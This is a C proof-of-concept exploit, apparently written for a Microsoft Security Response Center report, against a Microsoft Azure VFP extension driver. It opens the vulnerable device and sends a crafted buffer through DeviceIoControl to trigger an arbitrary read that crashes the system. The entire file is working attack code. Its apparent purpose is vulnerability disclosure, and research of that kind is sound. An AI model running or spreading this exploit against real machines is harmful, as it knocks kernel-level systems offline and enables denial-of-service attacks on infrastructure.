#include "msrc.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(TARGET_DEVICE, 0x80, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0x41414141;
	unsigned char unused = 0, input_output[536];

	memset(&input_output, 0x42, sizeof(input_output));

	SetConsoleTitleA("https://msrc.microsoft.com/");

	printf("[*] Microsoft Security and Response Center Report #2\n[*] Microsoft Azure VFP Extension Arbitrary Read via 'cmp' Instruction Denial of Service Vulnerability\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	printf("\n[!] Triggering denial of service via arbitrary read in 3...");
	for (int i = 2; i > 0; i--)
	{
		Sleep(1000);
		printf("\n[!] %d...", i);
	}
	Sleep(1000);

	DeviceIoControl(h_driver, TARGET_IOCTL, &input_output, sizeof(input_output), &input_output, sizeof(input_output), &bytes_returned, 0);

	printf("\n[-] Exploit failed. The system should have crashed by now.");
	unused = getchar();
	return 0;
}